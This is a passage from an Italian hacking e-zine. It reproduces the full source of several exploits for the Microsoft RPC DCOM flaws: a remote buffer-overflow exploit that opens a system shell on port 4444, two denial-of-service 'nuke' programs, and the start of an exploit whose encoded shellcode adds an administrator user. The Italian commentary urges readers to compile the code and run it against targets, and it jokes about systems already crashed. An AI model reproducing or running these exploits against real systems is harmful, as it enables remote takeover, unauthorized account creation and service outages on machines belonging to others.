,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C
,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};


/* ripped from TESO code */
void shell (int sock)
{
        int     l;
        char    buf[512];
        fd_set  rfds;


        while (1) {
                FD_SET (0, &rfds);
                FD_SET (sock, &rfds);

                select (sock + 1, &rfds, NULL, NULL, NULL);
                if (FD_ISSET (0, &rfds)) {
                        l = read (0, buf, sizeof (buf));
                        if (l <= 0) {
                                printf("\n - Connection closed by local user\n");
                                exit (EXIT_FAILURE);
                        }
                        write (sock, buf, l);
                }

                if (FD_ISSET (sock, &rfds)) {
                        l = read (sock, buf, sizeof (buf));
                        if (l == 0) {
                                printf ("\n - Connection closed by remote host.\n");
                                exit (EXIT_FAILURE);
                        } else if (l < 0) {
                                printf ("\n - Read failure\n");
                                exit (EXIT_FAILURE);
                        }
                        write (1, buf, l);
                }
        }
}


int main(int argc, char **argv)
{
    
    int sock;
    int len,len1;
    unsigned int target_id;
    unsigned long ret;
    struct sockaddr_in target_ip;
    unsigned short port = 135;
    unsigned char buf1[0x1000];
    unsigned char buf2[0x1000];

    printf("---------------------------------------------------------\n");
    printf("- Remote DCOM RPC Buffer Overflow Exploit\n");
    printf("- Original code by FlashSky and Benjurry\n");
    printf("- Rewritten by HDM <hdm [at] metasploit.com>\n");


    if(argc<3)
    {
        printf("- Usage: %s <Target ID> <Target IP>\n", argv[0]);
        printf("- Targets:\n");
        for (len=0; targets[len] != NULL; len++)
        {
            printf("-          %d\t%s\n", len, targets[len]);   
        }
        printf("\n");
        exit(1);
    }
 
    /* yeah, get over it :) */
    target_id = atoi(argv[1]);
    ret = offsets[target_id];
    
    printf("- Using return address of 0x%.8x\n", ret);

    memcpy(sc+36, (unsigned char *) &ret, 4);

    target_ip.sin_family = AF_INET;
    target_ip.sin_addr.s_addr = inet_addr(argv[2]);
    target_ip.sin_port = htons(port);

    if ((sock=socket(AF_INET,SOCK_STREAM,0)) == -1)
    {
        perror("- Socket");
        return(0);
    }
    
    if(connect(sock,(struct sockaddr *)&target_ip, sizeof(target_ip)) != 0)
    {
        perror("- Connect");
        return(0);
    }
    
    len=sizeof(sc);
    memcpy(buf2,request1,sizeof(request1));
    len1=sizeof(request1);
    
    *(unsigned long *)(request2)=*(unsigned long *)(request2)+sizeof(sc)/2;  
    *(unsigned long *)(request2+8)=*(unsigned long *)(request2+8)+sizeof(sc)/2;
    
    memcpy(buf2+len1,request2,sizeof(request2));
    len1=len1+sizeof(request2);
    memcpy(buf2+len1,sc,sizeof(sc));
    len1=len1+sizeof(sc);
    memcpy(buf2+len1,request3,sizeof(request3));
    len1=len1+sizeof(request3);
    memcpy(buf2+len1,request4,sizeof(request4));
    len1=len1+sizeof(request4);
    
    *(unsigned long *)(buf2+8)=*(unsigned long *)(buf2+8)+sizeof(sc)-0xc;
    

    *(unsigned long *)(buf2+0x10)=*(unsigned long *)(buf2+0x10)+sizeof(sc)-0xc;  
    *(unsigned long *)(buf2+0x80)=*(unsigned long *)(buf2+0x80)+sizeof(sc)-0xc;
    *(unsigned long *)(buf2+0x84)=*(unsigned long *)(buf2+0x84)+sizeof(sc)-0xc;
    *(unsigned long *)(buf2+0xb4)=*(unsigned long *)(buf2+0xb4)+sizeof(sc)-0xc;
    *(unsigned long *)(buf2+0xb8)=*(unsigned long *)(buf2+0xb8)+sizeof(sc)-0xc;
    *(unsigned long *)(buf2+0xd0)=*(unsigned long *)(buf2+0xd0)+sizeof(sc)-0xc;
    *(unsigned long *)(buf2+0x18c)=*(unsigned long *)(buf2+0x18c)+sizeof(sc)-0xc;
    
    if (send(sock,bindstr,sizeof(bindstr),0)== -1)
    {
            perror("- Send");
            return(0);
    }
    len=recv(sock, buf1, 1000, 0);
    
    if (send(sock,buf2,len1,0)== -1)
    {
            perror("- Send");
            return(0);
    }
    close(sock);
    sleep(1);
    
    target_ip.sin_family = AF_INET;
    target_ip.sin_addr.s_addr = inet_addr(argv[2]);
    target_ip.sin_port = htons(4444);

    if ((sock=socket(AF_INET,SOCK_STREAM,0)) == -1)
    {
        perror("- Socket");
        return(0);
    }
    
    if(connect(sock,(struct sockaddr *)&target_ip, sizeof(target_ip)) != 0)
    {
        printf("- Exploit appeared to have failed.\n");
        return(0);
    }   
    
    printf("- Dropping to System Shell...\n\n");

    shell(sock);
    
    return(0);
}

---8<------8<------8<------8<------8<------8<------8<------8<------8<---


 2) Quello di benjurry di www.securityfocus.com da compilare in "ci plas
    plas" <- ki mi kapisce merita un bacetto :-+ Questo exploit mette in
    croce solo windows2000.

---8<------8<------8<------8<------8<------8<------8<------8<------8<---

#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <process.h>
#include <string.h>
#include <winbase.h>

#pragma comment(lib, "ws2_32.lib")

unsigned char bindstr[]={
0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,
0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,
0xA0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,
0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,
0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};

unsigned char request[]={
0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x13,0x00,0x00,0x00,
0x90,0x00,0x00,0x00,0x01,0x00,0x03,0x00,0x05,0x00,0x06,0x01,0x00,0x00,0x00,0x00,
0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,
0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};



void main(int argc,char ** argv)
{
    WSADATA WSAData;
 int i;
    SOCKET sock;
    SOCKADDR_IN addr_in;
 
 short port=135;
 unsigned char buf1[0x1000];
 printf("RPC DCOM DOS Vulnerability discoveried by Xfocus.org\n");
 printf("Code by FlashSky,Flashsky xfocus org,benjurry,benjurry xfocus org\n");
 printf("Welcome to http://www.xfocus.net\n");
 if(argc<2)
 {
  printf("useage:%s target\n",argv[0]);
exit(1);
 }


    if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0)
    {
        printf("WSAStartup error.Error:%d\n",WSAGetLastError());
        return;
    }

    addr_in.sin_family=AF_INET;
    addr_in.sin_port=htons(port);
    addr_in.sin_addr.S_un.S_addr=inet_addr(argv[1]);
 
 if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)
    {
        printf("Socket failed.Error:%d\n",WSAGetLastError());
        return;
    }
 if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR)
 {
  printf("Connect failed.Error:%d",WSAGetLastError());
  return;
 }
 if (send(sock,bindstr,sizeof(bindstr),0)==SOCKET_ERROR)
 {
   printf("Send failed.Error:%d\n",WSAGetLastError());
   return;
 }

 i=recv(sock,buf1,1024,MSG_PEEK);
 if (send(sock,request,sizeof(request),0)==SOCKET_ERROR)
 {
   printf("Send failed.Error:%d\n",WSAGetLastError());
   return;
 }
 i=recv(sock,buf1,1024,MSG_PEEK);
}

---8<------8<------8<------8<------8<------8<------8<------8<------8<---
 


 3) www.securiteam.com per un buon attacco DoS.. pss... negli allegati
    trovate anche il GUI di Cyberbob... a proposito vorrei ricordarvi 
    una frase di vorago "un lamer è colui che usa programmi del cazzo
    prefatti dove c'è solo il tasto hack e exit" ;) riflettete
    kmq provatelo più di una volta per avere l'effetto desiderato...
    attenzione anche se il + piccolino è quello fatto meglio fin ora
    potremmo dire quello + cattivo... il bollettino microsoft inerente
    a questo exploit è MS03-010



---8<------8<------8<------8<------8<------8<------8<------8<------8<---

/*
************************************************************************
* MS WIN RPC DoS CODE FROM SPIKE v2.7
* 
* Compile it use:
* cl winnuke.c
*
* Usage:
* winnuke targetip 
*
* Code by lion, Welcomde to HUC Website Http://www.cnhonker.com
* 2002/10/22
************************************************************************
*/

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

char sendcode1[] = 
  "\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x02\x00\x00\x00"
  "\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
  "\x60\x9e\xe7\xb9\x52\x3d\xce\x11\xaa\xa1\x00\x00\x69\x01\x29\x3f"
  "\x02\x00\x02\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
  "\x2b\x10\x48\x60\x02\x00\x00\x00\x05\x00\x00\x01\x10\x00\x00\x00"
  "\xd0\x16\x00\x00\x8f\x00\x00\x00\x20\x27\x01\x00\x00\x00\x02\x00"
  "\xf0\x00\x00\x00\x00\x00\x00\x00\xf0\x00\x00\x00";

char sendcode2[] = 
  "\x88\x13\x00\x00\x00\x00\x00\x00\x88\x13\x00\x00";

char sendcode3[] = 
  "\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00";

char sendcode4[] = 
  "\xfe\xff\x00\x00\x00\x00\x00\x00\xfe\xff\x00\x00\x3d\x3d\x3d\x3d" 
  "\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d"
  "\x05\x00\x00\x00\x10\x00\x00\x00\xd0\x16\x00\x00\x8f\x00\x00\x00"
  "\x50\x10\x01\x00\x00\x00\x02\x00";

char sendcode5[] = 
  "\x05\x00\x00\x00\x10\x00\x00\x00\xd0\x16\x00\x00\x8f\x00\x00\x00"
  "\x80\xf9\x00\x00\x00\x00\x02\x00";

char sendcode6[] = 
  "\x05\x00\x00\x00\x10\x00\x00\x00\xd0\x16\x00\x00\x8f\x00\x00\x00"
  "\xb0\xe2\x00\x00\x00\x00\x02\x00";

char sendcode7[] = 
  "\x05\x00\x00\x02\x10\x00\x00\x00\x60\x15\x00\x00\x8f\x00\x00\x00"
  "\x60\x15\x00\x00\x00\x00\x02\x00";

char sendcode8[] = 
  "\x00\x00\x01\x10\x00\x00\x00\x00\x00\x00\x01\x10\x00\x00";

int main(int argc, char *argv[])
{
  WSADATA wsaData;
  WORD wVersionRequested;
  struct hostent *pTarget;
  struct sockaddr_in sock;
  char *targetip;
  int port,bufsize;
  SOCKET s;
  char buffer[20480];

  printf("========================= HUC Win2000/XP RPC Nuke V0.10 =======================\r\n");
  printf("================= By Lion, Welcome to http://www.cnhonker.com =================\r\n\n");

  if (argc < 2)
  {
    printf("Usage:\r\n");
    printf(" %s <TargetIP> [TargetPort]\r\n", argv[0]);
    printf("Example:\r\n");
    printf(" %s 192.168.0.1\r\n", argv[0]);
    printf(" %s 192.168.0.1 135\r\n", argv[0]);
    printf("PS:\r\n");
    printf(" If target is XP, try 2 times.\r\n");
    exit(1);
  }

  wVersionRequested = MAKEWORD(1, 1);
  if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;

  targetip = argv[1];
  port = 135;
  if (argc >= 3) port = atoi(argv[2]);
  bufsize = 512;
  if (argc >= 4) bufsize = atoi(argv[3]);

  s = socket(AF_INET, SOCK_STREAM, 0);
  if(s==INVALID_SOCKET)
  { 
    printf("Socket error!\r\n");
    exit(1);
  }

  printf("Resolving Hostnames...\n");
  if ((pTarget = gethostbyname(targetip)) == NULL)
  {
    printf("Resolve of %s failed, please try again.\n", argv[1]);
    exit(1);
  }

  memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
  sock.sin_family = AF_INET;
  sock.sin_port = htons((USHORT)port);

  printf("Connecting...\n");
  if ( (connect(s, (struct sockaddr *)&sock, sizeof (sock) )))
  {
    printf("Couldn't connect to host.\n");
    exit(1);
  }

  printf("Connected!...\n");
  printf("Sending Packets...\n");
  if (send(s, sendcode1, sizeof(sendcode1)-1, 0) == -1)
  {
    printf("Error sending nuke Packets\r\n");
    closesocket(s);
    exit(1);
  }

  memset(&buffer, '\x41', 240);
  send(s, buffer, 240, 0);

  send(s, sendcode2, sizeof(sendcode2)-1, 0);
  memset(&buffer, '\x42', 5000);
  send(s, buffer, 5000, 0);

  send(s, sendcode3, sizeof(sendcode3)-1, 0);
  memset(&buffer, '\x43', 512);
  send(s, buffer, 512, 0);
  
  send(s, sendcode4, sizeof(sendcode4)-1, 0);
// memset(&buffer, '\x44', 20480);
// send(s, buffer, 20480, 0);

// /*
  memset(&buffer, '\x44', 5000);
  send(s, buffer, 5000, 0);

  send(s, sendcode5, sizeof(sendcode5)-1, 0);
  memset(&buffer, '\x45', 5000);
  send(s, buffer, 5000, 0);

  send(s, sendcode6, sizeof(sendcode6)-1, 0);
  memset(&buffer, '\x46', 5000);
  send(s, buffer, 5000, 0);

  send(s, sendcode7, sizeof(sendcode7)-1, 0);
  memset(&buffer, '\x47', 5000);
  send(s, buffer, 5000, 0);

  send(s, sendcode8, sizeof(sendcode8)-1, 0);
  memset(&buffer, '\x48', 5000);
  send(s, buffer, 5000, 0);
  
// */ 
  printf("Nuked! \r\nIf target is XP, try a again! :)\r\n");
  closesocket(s);
  WSACleanup();
  return 0;
}

---8<------8<------8<------8<------8<------8<------8<------8<------8<---

 Beh che dire visti i vari numerini si  può  facilmente  intendere  che
 sono attacca buffer overflow ...      (anche il mio pesciolino se ne è
 accorto ma per completezza ho ritenuto opportuno dirlo) e anche se non
 dovrei dirlo,dopo questi attacchi il programma vi dirà  su quale porta
 agire per un collegamento root con telnet...  si...  il nostro vecchio
 caro telnet, ora che dirvi... rinfrescatevi i comandi di telnet... hih

 eh anche questo exploit è andato vi ricordo che negli allegati trovate
 un exploit già codato... il miglore) e gli altri da codare... vi resta
 solo che studiare e non divertirvi a crashare sistemi... hihi anche se
 per prova qualcuno purtroppo è andato a puttane... ma come si dice io
 non ho visto e sentito niente...

 CIao mondo crudele... addio mondo crudele... ci rivedremo un giorno...

 ciao dude... pss quando mi fai conoscere la tua ragazza? si lo so me 
 l'hai presentata... anzi no... kmq vorrei approfondire la conoscenza..
 capito cosa intendo? OOO ma che credi che ho cattive intenzioni? solo
 vorrei sapere dove cosa e come fa... :) bla bla bla...

 Rispondi in questo spazio senza insultarmi

 [
                                                               




                                                                     ]


 ah vi ho mai detto che la chiave della  vita  è  essere  perennemente 
 felici?  beh  penso  di  farci  sopra  un  bel  trattato   flosofico.
 Ah kmq fisicamente è bona la ragazza di cyber... buhahahahahaaahahahi
......•••.•••••••••••••••................
.......•••.•••.•...••.•••.............
.......•••••••••••.••.............
..........••••••••••••.•...............
........•••••••••••......••••••.......
.......••.•....•••..........•..
.............................
............................
..............................
.............................F
..............................F .`.(
...............F 44
........)(J)).
..)F"`
..F .  
(F 4
4)
..

--< unrelated at libero dot it >----------------------------------------
--------------------------------------¤ Lord Unrelated Lodeguns ¤-------
¢••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••




+--[HACKING]-------------------------------------------------------------[IL04]+
|  Titolo: Microsoft RPCSS DCOM Vulnerability                                  |
|  Autore: Cyberdude                                                           |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
Microsoft RPCSS DCOM  Interface  Long  Filename  Heap  Corruption Vulnerability
Ciao ragazzi, sono sempre io, sempre il solito Cyberdude, oggi  vorrei parlarvi 
di una vulnerabilità, una vulnerabilità scoperta dalla  microsoft  nel RPC… per 
chi non lo sapesse, RPC sta per Remote Procedure Call.Le routine RPC permettono 
ai programmi C di effettuare chiamate a procedure su altre macchine  attraverso 
la rete. Quando si parla di RPC il più delle volte si intende la  variante  Sun 
RPC. Ora la falla esiste nel servizio di RPCSS ed è collegata con il codice che 
maneggia i  messaggi  del  RPC  per  l'attivazione  di  DCOM quindi  può essere 
sfruttata da un  attacker  a  distanza  eseguendo  il  codice  arbitrario con i 
rispettivi privilegi sul SISTEMA. Bello vero? Ora voi  direte  e  come faccio a 
usufruirne?  Semplice  qui  di  seguito  ho allegato  il sorgente di RPCSSExp.c 
l'exploit che ci permette di sfruttare tale falla. Voi che dovete fare? emplice 
copiare   il   sorgete  e  incollarlo  in  un file  .txt  che   poi  andremo  a 
rinominare RPCSSExp.c quindi una volta  aperto  con  il  compilatore C renderlo 
eseguibile 
 

--[informazionelibera e-zine 04]-----[RPCSSExp.c]------------------[SORGENTE]---

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <string.h>
#include <winbase.h>

#pragma comment(lib,"ws2_32")

unsigned char bindstr[]={
0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,
0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,
0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,
0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,
0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};

unsigned char request1[]={
0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03
,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00
,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45
,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E
,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D
,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41
,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00
,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45
,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00
,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00
,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03
,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00
,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29
,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00
,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00
,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10
,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF
,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10
,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09
,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00
,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00
,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00
,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00
,0x00,0x00,0x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01
,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03
,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00
,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E
,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00
,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00
,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00
,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00
,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00};

unsigned char request2[]={
0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00
,0x00,0x00,0x5C,0x00,0x5C,0x00};

unsigned char request3[]={
0x5C,0x00
,0x43,0x00,0x24,0x00,0x5C,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00
,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00
,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00
,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};

//user="e" pass="asd#321"
unsigned char sc_add_user[]=
"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x3E\x01\x80\x34\x0A\x99\xE2\xFA"
"\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x31\x99\x99\x99\xC3\x21\x95\x69"
"\x64\xE6\x12\x99\x12\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5"
"\x9A\x6A\x12\xEF\xE1\x9A\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA"
"\x74\xCF\xCE\xC8\x12\xA6\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED"
"\x91\xC0\xC6\x1A\x5E\x9D\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF"
"\xBD\x9A\x5A\x48\x78\x9A\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A"
"\x5A\x58\x78\x9B\x9A\x58\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F"
"\x97\x12\x49\xF3\x9A\xC0\x71\xBD\x99\x99\x99\xF1\x66\x66\x66\x99"
"\xF1\x99\x89\x99\x99\xF3\x9D\x66\xCE\x6D\x22\x81\x69\x64\xE6\x10"
"\x9A\x1A\x5F\x95\xAA\x59\xC9\xCF\x66\xCE\x61\xC9\x66\xCE\x65\xAA"
"\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B"
"\x77\xAA\x59\x5A\x71\xCA\x66\x66\x66\xDE\xFC\xED\xC9\xEB\xF6\xFA"
"\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xD1\xFC\xF8\xE9\xDA\xEB\xFC\xF8"
"\xED\xFC\x99\xCE\xF0\xF7\xDC\xE1\xFC\xFA\x99\xDC\xE1\xF0\xED\xC9"
"\xEB\xF6\xFA\xFC\xEA\xEA\x99\xFA\xF4\xFD\xB9\xB6\xFA\xB9\xF7\xFC"
"\xED\xB9\xEC\xEA\xFC\xEB\xB9\xFC\xB9\xF8\xEA\xFD\xBA\xAA\xAB\xA8"
"\xB9\xB6\xF8\xFD\xFD\xB9\xBF\xBF\xB9\xF7\xFC\xED\xB9\xF5\xF6\xFA"
"\xF8\xF5\xFE\xEB\xF6\xEC\xE9\xB9\xF8\xFD\xF4\xF0\xF7\xF0\xEA\xED"
"\xEB\xF8\xED\xF6\xEB\xEA\xB9\xFC\xB9\xB6\xF8\xFD\xFD\x99";
#define	sc_offset		0x24
#define	sc_max			0x208
#define	jmp_addr_offset	sc_max+sc_offset+0x8
#define	top_seh_offset	jmp_addr_offset+0x4

unsigned char sc[]=
"\x31\x00\x32\x00\x37\x00\x2e\x00\x30\x00\x2e\x00"
"\x30\x00\x2e\x00\x31\x00\x5c\x00\x49\x00\x50\x00"
"\x43\x00\x24\x00\x5c\x00"
"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
"\xe9\xf3\xfd\xff\xff"
"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE";

unsigned char request4[]={
